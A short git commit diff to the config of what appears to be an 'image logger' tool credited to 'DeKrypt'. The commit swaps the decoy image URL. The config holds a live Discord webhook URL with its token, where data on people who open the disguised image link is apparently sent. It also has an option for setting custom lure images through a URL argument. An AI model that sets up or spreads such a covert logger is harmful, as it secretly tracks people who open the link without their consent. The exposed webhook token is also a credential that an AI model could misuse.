b40cb03a8a2edf56e40da02585b9dc4c0e7e4f06
DataMoonPro <datamoonpro@gmail.com>
2025-04-28 22:27:42 +0200

    Update image.py

--- api/image.py
+++ api/image.py
@@ -11,7 +11,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discordapp.com/api/webhooks/1366503969400033320/EmD2XCy4mgNUKDyLghknjS8cBG1vZPffsjEQ_xfVL-34gY5N101Lrv6gDjxltLAokzly",
-    "image": "https://wallpapers.com/images/featured/discord-profile-pictures-xk3qyllfj1j46kte.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://images.techhive.com/images/article/2014/04/windows-xp-bliss-desktop-image-100259888-orig.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
